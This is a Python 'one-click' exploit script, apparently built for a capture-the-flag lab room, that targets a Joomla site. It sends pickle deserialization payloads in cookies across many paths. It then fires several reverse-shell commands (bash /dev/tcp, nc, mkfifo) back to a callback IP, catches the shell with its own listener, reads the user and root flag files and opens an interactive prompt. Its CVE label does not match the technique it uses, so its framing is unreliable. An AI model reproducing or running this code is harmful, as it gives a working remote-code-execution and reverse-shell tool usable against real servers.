#!/usr/bin/env python3
"""
CVE-2023-23752 - Voyage Hunt - ULTIMATE ONE-CLICK EXPLOIT
Everything in ONE command!
"""

import socket
import threading
import time
import requests
import pickle
import binascii
import os
import sys

TARGET = "http://10.82.166.188"
DEFAULT_PORT = 4444

COOKIE_NAMES = [
    "310c29008fc04f792e0bccb4682e5b78",
    "03245e095856e4447d1dfb528d67c5d3",
    "userData",
    "user_data",
    "session",
    "PHPSESSID",
    "auth",
    "profile",
    "prefs",
    "data",
    "remember",
]

TRIGGER_PATHS = [
    "/",
    "/index.php",
    "/administrator/index.php",
    "/index.php/component/users/login?Itemid=101",
    "/index.php/component/users/reset?Itemid=101",
    "/index.php/component/users/remind?Itemid=101",
    "/api/index.php/v1/config/application?public=true",
    "/api/index.php/v1/users?public=true",
    "/api/components/",
    "/api/includes/",
    "/api/language/",
    "/plugins/system/",
    "/plugins/user/",
    "/plugins/task/",
    "/plugins/webservices/",
    "/templates/system/",
    "/tmp/",
]

shell_active = False
shell_conn = None
shell_data = ""
external_listener_mode = False


def detect_local_ip():
    """Best-effort detection of local callback IP."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        s.close()


def build_payload(command):
    """Generate pickle-hex payload with command execution."""

    class ReverseShell:
        def __reduce__(self):
            return os.system, (command,)

    cookie = {"user": ReverseShell(), "revenue": "999999"}
    raw = pickle.dumps(cookie, protocol=4)
    return binascii.hexlify(raw).decode()


def send_exploit(payload):
    """Try multiple cookie names and paths to trigger deserialization."""
    for cookie_name in COOKIE_NAMES:
        for path in TRIGGER_PATHS:
            try:
                session = requests.Session()
                session.cookies.set(cookie_name, payload)
                resp = session.get(TARGET + path, timeout=5)
                print(f"[*] Tried {cookie_name} on {path} -> HTTP {resp.status_code}")
            except Exception:
                pass

    # Explicit cookie header as fallback
    try:
        headers = {"Cookie": f"userData={payload}"}
        resp = requests.get(TARGET + "/", headers=headers, timeout=5)
        print(f"[*] Tried raw Cookie header on / -> HTTP {resp.status_code}")
    except Exception:
        pass

def reverse_shell_commands(callback_ip, callback_port):
    """Return several reverse-shell command variants for reliability."""
    return [
        f'bash -c "bash -i >& /dev/tcp/{callback_ip}/{callback_port} 0>&1"',
        f'sh -c "sh -i >& /dev/tcp/{callback_ip}/{callback_port} 0>&1"',
        f"mkfifo /tmp/p; /bin/sh -i < /tmp/p 2>&1 | nc {callback_ip} {callback_port} > /tmp/p",
        f"nc -e /bin/sh {callback_ip} {callback_port}",
    ]


def run_trigger_preflight(sleep_seconds=7, threshold=5.8):
    """Verify whether any tested endpoint appears to deserialize the payload."""
    print("[STEP 0] Preflight: checking whether any HTTP endpoint actually triggers the payload...")
    payload = build_payload(f"sleep {sleep_seconds}")
    hits = []

    for path in TRIGGER_PATHS:
        try:
            t0 = time.time()
            resp = requests.get(TARGET + path, timeout=12)
            baseline = time.time() - t0
            print(f"[*] Baseline {path} -> HTTP {resp.status_code} in {baseline:.2f}s")
        except Exception as e:
            print(f"[-] Baseline failed on {path}: {e}")
            continue

        for cookie_name in COOKIE_NAMES:
            try:
                session = requests.Session()
                session.cookies.set(cookie_name, payload)
                t1 = time.time()
                resp = session.get(TARGET + path, timeout=max(15, sleep_seconds + 5))
                observed = time.time() - t1
                delta = observed - baseline
                if delta >= threshold:
                    hit = (path, cookie_name, resp.status_code, round(baseline, 2), round(observed, 2), round(delta, 2))
                    hits.append(hit)
                    print(f"[HIT] path={path} cookie={cookie_name} code={resp.status_code} delta={delta:.2f}s")
            except Exception:
                pass

    if hits:
        print("[+] Preflight found candidate trigger(s):")
        for hit in hits:
            print(f"    path={hit[0]} cookie={hit[1]} code={hit[2]} base={hit[3]} now={hit[4]} delta={hit[5]}")
        return True

    print("[-] Preflight found no time-based trigger on the tested HTTP surface.")
    print("[*] Meaning: requests are reaching the server, but no tested endpoint is deserializing your pickle payload.")
    print("[*] Next action: enumerate more endpoints or find the real internal trigger before retrying the reverse shell.")
    return False


def print_banner():
    print("\n" + "="*70)
    print("CVE-2023-23752 - Voyage Hunt ONE-CLICK EXPLOIT")
    print("="*70 + "\n")

def reset_shell_state():
    global shell_active, shell_conn, shell_data
    shell_active = False
    shell_conn = None
    shell_data = ""


def listen_for_shell(port, timeout=20):
    """Start socket listener and accept shell connection"""
    global shell_active, shell_conn, shell_data
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('0.0.0.0', port))
        sock.listen(1)
        sock.settimeout(timeout)
        
        print(f"[*] Listener started on 0.0.0.0:{port}")
        print("[*] Waiting for reverse shell connection...")
        
        try:
            shell_conn, addr = sock.accept()
            shell_active = True
            print(f"[+] CONNECTION RECEIVED! Shell from {addr[0]}")
            
            # Read all data
            while True:
                try:
                    data = shell_conn.recv(4096)
                    if not data:
                        break
                    shell_data += data.decode('utf-8', errors='ignore')
                except:
                    break
                    
        except socket.timeout:
            print("[-] Timeout - no connection received")
        finally:
            sock.close()
            
    except Exception as e:
        print(f"[-] Listener error: {e}")


def try_callback(callback_ip, callback_port):
    """Try one callback endpoint with multiple shell command variants."""
    reset_shell_state()
    listener_thread = None
    if not external_listener_mode:
        listener_thread = threading.Thread(
            target=listen_for_shell,
            args=(callback_port, 20),
            daemon=True,
        )
        listener_thread.start()
        time.sleep(1)
    else:
        print(f"[*] External listener mode active. Expect shell on your nc listener at {callback_ip}:{callback_port}")

    commands = reverse_shell_commands(callback_ip, callback_port)
    for i, cmd in enumerate(commands, start=1):
        print(f"[*] Attempting payload variant {i}/{len(commands)} on {callback_ip}:{callback_port}")
        payload = build_payload(cmd)
        try:
            send_exploit(payload)
            print("[+] Exploit attempts sent")
        except Exception as e:
            print(f"[-] Error while sending exploit: {e}")

        waited = 0
        max_wait = 10
        while not shell_active and waited < max_wait:
            time.sleep(0.5)
            waited += 0.5
            sys.stdout.write('.')
            sys.stdout.flush()
        print()
        if shell_active:
            return True

        if external_listener_mode:
            print("[*] No in-script shell verification in external listener mode. Check your nc terminal.")

    if listener_thread is not None:
        listener_thread.join(timeout=0.2)
    return False

def send_command(cmd):
    """Send command through shell and get response"""
    global shell_conn, shell_data
    
    if not shell_conn:
        return None
    
    try:
        shell_data = ""
        shell_conn.send((cmd + "\n").encode())
        time.sleep(1.5)
        return shell_data
    except:
        return None

# ============ MAIN ============
print_banner()

# Dynamic callback endpoint selection
default_ip = detect_local_ip()
user_ip = input(f"[?] Callback IP (default {default_ip}): ").strip()
ATTACKER_IP = user_ip if user_ip else default_ip

user_port = input(f"[?] Callback Port (default {DEFAULT_PORT}, empty = auto ports 4444,443,80): ").strip()
if user_port.isdigit():
    callback_ports = [int(user_port)]
else:
    callback_ports = [4444, 443, 80]

listener_mode = input("[?] Use external nc listener? (y/N): ").strip().lower()
external_listener_mode = listener_mode in ("y", "yes")

print(f"[*] Using callback IP: {ATTACKER_IP}")
print(f"[*] Port candidates: {callback_ports}")
print(f"[*] Listener mode: {'external nc' if external_listener_mode else 'built-in'}")

preflight_ok = run_trigger_preflight()
if not preflight_ok:
    sys.exit(2)

# Step 1-3: Try callback combinations
print("[STEP 1-3] Starting listener + sending exploit + waiting for shell...")
connected = False
for port in callback_ports:
    print(f"\n[*] Trying callback endpoint {ATTACKER_IP}:{port}")
    if try_callback(ATTACKER_IP, port):
        connected = True
        print(f"[+] Callback success on {ATTACKER_IP}:{port}")
        break

if not connected:
    print("[-] No shell connection on any tested callback port.")
    if external_listener_mode:
        print("[*] If you used nc in another terminal, review that terminal for a shell.")
    print("[*] Quick checks:")
    print("    1) Use your THM VPN/AttackBox IP, not 127.0.0.1")
    print("    2) Allow inbound Windows firewall for selected port")
    print("    3) Try running from AttackBox directly")
    sys.exit(1)

print("\n[+] SHELL CONNECTED!\n")
time.sleep(1)

# Step 4: Get flags
print("[STEP 4] Extracting flags...\n")

# USER FLAG
print("[*] Getting USER FLAG...")
output = send_command("cat /home/*/user.txt")
user_flag = None
if output and output.strip():
    lines = [l.strip() for l in output.split('\n') if l.strip()]
    if lines:
        user_flag = lines[-1]

if user_flag and len(user_flag) > 5:
    print("\n" + "="*70)
    print(f"USER FLAG: {user_flag}")
    print("="*70 + "\n")
else:
    print("[-] User flag not found\n")

# ROOT FLAG
print("[*] Getting ROOT FLAG...")
root_flag = None

locations = [
    "cat /mnt/*/root.txt",
    "cat /root/root.txt", 
    "cat /host/root/root.txt"
]

for cmd in locations:
    output = send_command(cmd)
    if output and output.strip():
        lines = [l.strip() for l in output.split('\n') if l.strip()]
        if lines:
            candidate = lines[-1]
            if len(candidate) > 5 and not "No such file" in candidate:
                root_flag = candidate
                break

if root_flag and len(root_flag) > 5:
    print("\n" + "="*70)
    print(f"ROOT FLAG: {root_flag}")
    print("="*70 + "\n")
else:
    print("[-] Root flag not found\n")

# Step 5: Interactive shell (optional)
print("="*70)
print("Interactive Shell (type 'exit' to quit)")
print("="*70 + "\n")

try:
    while True:
        cmd = input("Shell> ").strip()
        if cmd.lower() == 'exit':
            break
        if cmd:
            output = send_command(cmd)
            if output:
                print(output)
except KeyboardInterrupt:
    print("\n\nClosing...")
except:
    pass

print("\n[+] Done!\n")
